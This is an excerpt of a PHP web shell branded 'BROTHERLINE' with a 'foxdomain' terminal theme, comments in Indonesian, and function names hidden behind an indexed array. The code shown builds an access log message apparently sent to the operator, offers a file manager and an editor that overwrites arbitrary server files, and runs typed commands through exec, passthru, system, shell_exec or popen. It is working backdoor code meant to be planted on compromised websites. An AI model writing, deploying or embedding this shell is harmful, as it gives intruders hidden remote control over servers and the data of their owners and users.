...
if (!isset($_SESSION[$session_key_tele])) {
    $msg = "<b>BROTHERLINE SHELL LOG</b>\n\n";
    $msg .= "Path: " . $_SERVER['SERVER_NAME'] . parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH) . "\n";
...
?>
    ...
    <head>
        ...
        <title>terminal@foxdomain</title>
    ...
    <body>
        ...
        <div class="relative w-full h-screen max-h-screen">
            <div class="absolute top-10 left-10 flex items-center right-10 gap-4 border-b border-[rgba(0,255,65,0.3)]">
                ...
                <div class="text-[#00ff41] text-base opacity-[0.6] spacing-2">root@foxdomain: ~</div>
            </div>
            <div class="flex justify-center w-full h-screen items-center">
                <div class="flex flex-col w-2/6 mx-auto gap-8">
                    <img src="https://raw.githubusercontent.com/angelineuniverse/shell/refs/heads/main/logo_tr_fox.png" alt="logo" class="h-26 w-26 mx-auto">
                    ...
                    <div class="bg-[#0a0e2799] border border-[#129e35bd] border-2 rounded p-8 shadow-[0_0_30px_rgba(0,255,65,0.1)]">
                        <div class="flex items-center gap-2 mb-4">
                            ...
                            <span class="text-[#00ff41]">㉿</span>
                            <span class="text-[#4a9eff]">foxdomain</span>
                            <span class="text-[#00ff41]">)-[</span>
...
<body class="bg-[#0a192f] p-5 flex flex-col gap-4">
    ...
    <div class="rounded-md p-6 border border-[#64ffda] text-sm flex flex-col gap-4">
        ...
        <form action="" method="post">
            <table class="w-full rounded-md relative">
                <thead class="sticky top-0 text-[#64ffda] text-sm z-10 bg-[#0a192f]">
                    ...
                    <?php foreach ($file_manager as $key => $_F) : ?>
                        <?php if ($fungsi[3]($_F)) : ?>
                            <tr>
                                <td class="px-7 py-2">
                                    <?= file_ext($_F) ?>
                                    <a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="cursor-pointer hover:underline hover:text-blue-500"><?= fullName($_F); ?></a>
                                </td>
            ...
            <div id="modal-terminal" class="z-10 absolute left-0 right-0 bottom-0 top-0 bg-black/50">
                <div class="w-full h-screen flex justify-center items-center">
                    <div class="text-white bg-black border border-gray-800 rounded-md h-fit w-3/6 flex flex-col">
                        ...
                        <pre disabled class="w-full h-[35rem] overflow-auto p-2 bg-black text-white whitespace-pre">
                        ...
                        <form action="" method="post" class="pb-2">
                            <div class="flex gap-5 items-center">
                                <input type="text" name="terminal-text"
                                    class="focus:border-none border-transparent focus:outline-none focus:ring-0 w-full max-w-5/6 px-3 py-2"
                                    placeholder="<?= $fungsi[9]() . "@" . $_SERVER["SERVER_ADDR"] . ':' . basename($_SESSION['cwd'] ?? getcwd()); ?>" autofocus>
                ...
                <div class="w-full h-screen flex justify-center items-center">
                    <div class="bg-white text-gray-800 rounded-lg h-fit w-2/6 p-7">
                        ...
                        <form action="" method="post" class="flex flex-col gap-5">
                            ...
                            <div class="flex justify-end gap-4">
                                <a href="<?= clean_url() ?>" class="text-white px-3 py-1 cursor-pointer rounded-md bg-red-600">
                                    <i class="fa-solid fa-xmark"></i> Close
                                </a>
                                <button type="submit" name="submit" class="text-white px-3 py-1 cursor-pointer rounded-md bg-green-600">
                                    <i class="fa-solid fa-check"></i> Submit
        ...
        <?php if (isset($_GET['f'])) : ?>
            <div id="modal-editor" class="fixed inset-0 z-10 bg-black/75 flex justify-center items-center">
                <form id="editor-form" action="" method="post" class="bg-gray-900 text-white rounded-lg w-5/6 max-h-[120vh] flex flex-col shadow-2xl">
                    <div class="px-5 py-3 border-b border-gray-700">
                        <h3 class="font-semibold text-lg">
                            <i class="fa-solid fa-code mr-2"></i>
                            Code Editor: <span class="text-yellow-400"><?= htmlspecialchars(decrypt_hex($_GET['f'])); ?></span>
                        </h3>
                    </div>
                    <div class="flex-grow min-h-0">
                        <textarea name="edited_code_data" class="flex-grow w-full bg-black font-mono text-white text-sm h-[70vh]"><?= htmlspecialchars($fungsi[11]($fungsi[0]() . "/" . decrypt_hex($_GET['f']))); ?></textarea>
                    </div>
                    <div class="flex justify-end gap-3 p-3 border-t border-gray-700">
                        <a href="<?= clean_url() ?>" class="text-white px-4 py-2 rounded-md bg-red-600 hover:bg-red-700 transition">
                            <i class="fa-solid fa-xmark mr-1"></i> Close
                        </a>
                        <button type="submit" name="btn-save-file" class="text-white px-4 py-2 rounded-md bg-green-600 hover:bg-green-700 transition">
...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    if (isset($_POST['btn-save-file'])) {
        $content_to_save = $_POST['edited_code_data'];
        $repl = str_replace("\\", "/", $fungsi[0]());
        $full_path = $repl . "/" . decrypt_hex($_GET['f']);
        $result = $fungsi[28]($full_path, $content_to_save);
        refreshPages();
    }
}
...
function terminal_cmd($in, $re = false)
{
    ...
    // Tangani perintah cd secara khusus
    if (preg_match('/^\s*cd\s+(.+)$/', $in, $matches)) {
        $target_dir = trim($matches[1]);

        // Gunakan chdir untuk validasi (lebih reliable)
        $original_cwd = getcwd();

        // Coba ganti direktori
        if (@chdir($_SESSION['cwd']) && @chdir($target_dir)) {
            // Berhasil, update session
            $_SESSION['cwd'] = getcwd();
            chdir($original_cwd); // Kembali ke direktori asli
            return "Changed directory to: " . $_SESSION['cwd'];
        } else {
            // Gagal
            chdir($original_cwd);
            return "cd: no such directory: " . $target_dir;
        }
    }

    // Untuk perintah lain, jalankan di direktori yang disimpan
    $original_cwd = getcwd();
    chdir($_SESSION['cwd']);
    ...
    try {
        if (function_exists("exec")) {
            $output_array = [];
            @$GLOBALS['fungsi'][16]($cmd, $output_array);
            $out = implode("\n", $output_array);
        } elseif (function_exists("passthru")) {
            ob_start();
            @$GLOBALS['fungsi'][17]($cmd);
            $out = ob_get_clean();
        } elseif (function_exists("system")) {
            ob_start();
            @$GLOBALS['fungsi'][18]($cmd);
            $out = ob_get_clean();
        } elseif (function_exists("shell_exec")) {
            $out = $GLOBALS['fungsi'][19]($cmd);
        } elseif (function_exists("popen") && function_exists("pclose")) {
            if (is_resource($f = @$GLOBALS['fungsi'][20]($cmd, "r"))) {
                $out = "";
                while (!feof($f)) {
                    $out .= fread($f, 1024);
                }
